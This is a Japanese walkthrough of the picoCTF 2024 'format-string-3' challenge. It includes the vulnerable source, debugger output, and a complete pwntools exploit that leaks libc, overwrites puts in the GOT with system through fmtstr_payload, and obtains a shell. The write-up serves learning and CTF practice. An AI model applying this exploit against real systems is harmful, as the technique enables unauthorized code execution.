Medium の問題です。

バイナリファイル（format-string-3）が 1つと、ソースファイル（format-string-3.c）が 1つと、
libc（libc.so.6）と、動的リンカ（ld-linux-x86-64.so.2）がダウンロードできます。

また、インスタンス（サーバ）を起動できます。

表層解析から行います。

スタックカナリヤが有効で、メモリ実行可能です。

追加で lddコマンドを実行しました。

ダウンロードした libc と ld-linux が使われるようです（libc はいいですが、ld-linux は表示が少しおかしい？）。

```sh
$ file format-string-3
format-string-3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=54e1c4048a725df868e9a10dc975a46e8d8e5e92, not stripped

$ checksec --file=format-string-3
RELRO          STACK CANARY  NX           PIE    RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  Canary found  NX disabled  No PIE No RPATH  RW-RUNPATH  44 Symbols  No       0          2            format-string-3

$ ldd format-string-3
	linux-vdso.so.1 (0x00007ffea8767000)
	libc.so.6 => ./libc.so.6 (0x00007fbb84dec000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fbb84fd0000)
```

ソースコードを見てみます。

フラグの表示がありませんね。シェルを取得する問題だと思います。

書式文字列攻撃で、最後の puts関数を system関数に置き換えることが出来れば良さそうですね、

puts関数の引数が `/bin/sh` にしてくれてますし。

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

puts関数のアドレスを知る必要がありますが、ASLR のため、事前には得られません。

setvbuf関数のアドレスも毎回変化しますが、アドレスを表示してくれているので、これを使うと相対的に system関数のアドレスが求まりそうです。

一度実行してみます。

```sh
$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fbe141303f0
aa
aa
/bin/sh
```

まず、アドレスを調べます。

setbuf関数の libc内の相対アドレスは `0x7a3f0` で、system関数の libc内の相対アドレスは `0x4f760` です。

setbuf関数の絶対アドレスが表示されるので、setbuf関数の相対アドレスを引くと、libcのベースアドレスが求まります。

system関数の相対アドレスを足すと、system関数の絶対アドレスが求まります。

```sh
$ nm -D libc.so.6 | grep setvbuf
000000000007a3f0 T _IO_setvbuf@@GLIBC_2.2.5
000000000007a3f0 W setvbuf@@GLIBC_2.2.5

$ nm -D libc.so.6 | grep system
000000000004f760 T __libc_system@@GLIBC_PRIVATE
000000000014e1c0 T svcerr_systemerr@GLIBC_2.2.5
000000000004f760 W system@@GLIBC_2.2.5
```

GDB でアセンブラを確認します。

RSP + 0x100（rbp - 0x410）のアドレスを buf に使っているようです。

つまり、レジスタ 5個 と 8byte が 32個（0x100 / 8 = 32）で、計37個なので、38番目に buf が出現するはずです。

```asm
pwndbg> nearpc 20
 ? 0x40124b <main+8>      sub    rsp, 0x510                     RSP => 0x7fffffffe120 - 0x510
   0x401252 <main+15>     mov    rax, qword ptr fs:[0x28]       RAX, [0x7ffff7ddd768]
   0x40125b <main+24>     mov    qword ptr [rbp - 8], rax
   0x40125f <main+28>     xor    eax, eax                       EAX => 0
   0x401261 <main+30>     lea    rdx, [rbp - 0x510]
   0x401268 <main+37>     mov    eax, 0                         EAX => 0
   0x40126d <main+42>     mov    ecx, 0x20                      ECX => 0x20
   0x401272 <main+47>     mov    rdi, rdx
   0x401275 <main+50>     rep stosq qword ptr [rdi], rax
   0x401278 <main+53>     mov    qword ptr [rbp - 0x410], 0
   0x401283 <main+64>     mov    qword ptr [rbp - 0x408], 0
   0x40128e <main+75>     lea    rdx, [rbp - 0x400]
   0x401295 <main+82>     mov    eax, 0                         EAX => 0
   0x40129a <main+87>     mov    ecx, 0x7e                      ECX => 0x7e
   0x40129f <main+92>     mov    rdi, rdx
   0x4012a2 <main+95>     rep stosq qword ptr [rdi], rax
   0x4012a5 <main+98>     mov    eax, 0                         EAX => 0
   0x4012aa <main+103>    call   setup                       <setup>

   0x4012af <main+108>    mov    eax, 0                      EAX => 0
   0x4012b4 <main+113>    call   hello                       <hello>

   0x4012b9 <main+118>    mov    rdx, qword ptr [rip + 0x2db0]     RDX, [stdin@GLIBC_2.2.5]
   0x4012c0 <main+125>    lea    rax, [rbp - 0x410]
   0x4012c7 <main+132>    mov    esi, 0x400                        ESI => 0x400
   0x4012cc <main+137>    mov    rdi, rax
   0x4012cf <main+140>    call   fgets@plt                   <fgets@plt>
(以降、割愛）
```

やってみます。合っているようです。

```sh
$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f6baf1d03f0
AAAABBBB,%38$p
AAAABBBB,0x4242424241414141
/bin/sh
```

あとは、puts関数の GOT を調べます。`0x404018` でした。

```sh
$ readelf -r format-string-3

Relocation section '.rela.dyn' at offset 0x15d8 contains 6 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fe8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403ff0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403ff8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000404060  000700000005 R_X86_64_COPY     0000000000404060 stdout@GLIBC_2.2.5 + 0
000000404070  000900000005 R_X86_64_COPY     0000000000404070 stdin@GLIBC_2.2.5 + 0
000000404080  000a00000005 R_X86_64_COPY     0000000000404080 stderr@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x1668 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000404028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
```

pwndbg の場合は、gotコマンドが使えます。楽ちんです。

```sh
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/user/svn/experiment/picoCTF/picoCTF2024_BinaryExploitation/format-string-3:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ?? endbr64
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401040 ?? endbr64
[0x404028] printf@GLIBC_2.2.5 -> 0x401050 ?? endbr64
[0x404030] fgets@GLIBC_2.2.5 -> 0x401060 ?? endbr64
```

情報は揃ったので、pwntools を使って実装していきます。

pwntools には、fmtstr_payload という書式文字列攻撃を自動化する便利な関数が用意されているそうです。

今回はこれを使ってみます。ちょっと練習してみます。

まず、練習として、グローバル変数の normal_string を書き換えてみます。アドレスを調べます。

```sh
$ nm format-string-3 | grep normal_st
0000000000404048 D normal_string

gdb-peda$ x/1xg 0x404048
0x404048 <normal_string>:       0x0000000000402008
gdb-peda$ x/1s 0x402008
0x402008:       "/bin/sh"
```

* 第1引数 offset：オフセット、今回は 38 です
* 第2引数 writes：書き込み先のアドレスと値の辞書、今回は、0x402008 に、例えば、0x47414c46（FLAG）を書きたいので、`{0x402008: 0x47414c46}` にします
* 第3引数 numbwritten：printf関数が既に出力したバイト数、今回は 0 です
* 第4引数 write_size：何byteずつ書き込むか（int or short or byte）、大きくなりそうなので short にします。

まず、x86-64 を設定します。

作られたペイロードを見ると、下位16bit（0x4c46）の方が、上位16bit（0x4741）より大きいので、先に、上位16bitから指定しています。

```sh
>>> context.binary = '/bin/bash'
[*] '/bin/bash'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
>>> context.arch, context.bits
('amd64', 64)
>>> fmtstr_payload(offset=38, writes={0x402008: 0x47414c46}, numbwritten=0, write_size="short"
)
b'%19526c%42$lln%64251c%43$hnaaaab\x08 @\x00\x00\x00\x00\x00\n @\x00\x00\x00\x00\x00'
>>> fmtstr_payload(offset=38, writes={0x402008: 0x47414c46}, numbwritten=0, write_size="short").hex()
'25313935323663253432246c6c6e2536343235316325343324686e616161616208204000000000000a20400000000000'
```

では、試してみます。うーん、セグメンテーションフォールトが発生します。

```sh
$ python -c 'from pwn import *; context.bits=64; print(fmtstr_payload(offset=38, writes={0x402008: 0x47414c46}, numbwritten=0, write_size="short").decode("utf-8"))' | ./format-string-3
（途中、省略）
Segmentation fault
```

「format string 2」で試してみます。うまくいきますね。

```sh
$ python -c 'from pwn import *; context.bits=64; print(fmtstr_payload(offset=14, writes={0x404060: 0x67616c66}, numbwritten=0, write_size="short").decode("utf-8"))' | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:                                                                            
（途中、省略）
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{FLAGFLAGFLAG}
```

あ、分かりました、間違えてました。

0x402008 は、normal_string に格納されているアドレスであり、"/bin/sh" が格納されているアドレスなので、
そこを書き換えるということは、const領域を書き換えることになるからですね。

それは Read Only なはずなので無理でした。

では、代わりに、normal_string に格納されているアドレスを書き換えるようにします。

0x402008 が格納されているので、それを 2byte ずらして、0x40200a に書き換えます。

"/b" が消えて、2byte進んだところから表示されました、想定通りです。

```sh
$ python -c 'from pwn import *; context.bits=64; print(fmtstr_payload(offset=38, writes={
0x404048: 0x40200a}, numbwritten=0, write_size="short").decode("utf-8"))' | ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f7af9fa73f0
（途中、省略）
in/sh
```

何個あるかとか数えなくていいので便利ですね。実装した Pythonスクリプトは以下です。

```python
import os, sys
from pwn import *

# $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./format-string-3"
# $ python tmp.py

context.bits = 64

adrs = '127.0.0.1'
#adrs = 'rhea.picoctf.net'
port = 4000
#port = 65028

setbuf_raddr = 0x7a3f0
system_raddr = 0x4f760
puts_got = 0x404018

proc = remote( adrs, port )

print( proc.recvline() ) # Howdy gamers!
ret = proc.recvline()    # Okay I'll be nice. Here's the address of setvbuf in libc:
print( ret )

ret = ret.decode( 'utf-8' )

assert "setvbuf" in ret, f"ret={ret}"

idx = ret.index("libc")
setbuf_aaddr = int( ret[idx + 6:], base=16 )
print( f"setbuf_aaddr={setbuf_aaddr}" )

libc_base    = setbuf_aaddr - setbuf_raddr
system_aaddr = libc_base + system_raddr

payload = fmtstr_payload( offset=38, writes={puts_got: system_aaddr}, numbwritten=0, write_size="short" )

proc.send( payload )

proc.interactive()
```

実行します。

```sh
$ python tmp.py
[+] Opening connection to 127.0.0.1 on port 4000: Done
b'Howdy gamers!\n'
b"Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f504fe933f0\n"
setbuf_aaddr=139982914794480
[*] Switching to interactive mode
$ ls
（途中、省略）
atk.bin
flag.txt
format-string-0
format-string-0.c
format-string-1
format-string-1.c
format-string-3
format-string-3.c
heap0
heap1
heap2
heap3
ld-linux-x86-64.so.2
libc.so.6
peda-session-chall.txt
peda-session-format-string-1.txt
peda-session-format-string-3.txt
peda-session-vuln.txt
pwnable.log
pwnable.py
secret-menu-item-1.txt
secret-menu-item-2.txt
tmp.py
vuln
vuln.c
```

シェルが取れました。サーバでも同じようにすると、カレントディレクトリに flag.txt があり、cat すると、フラグが表示されました。
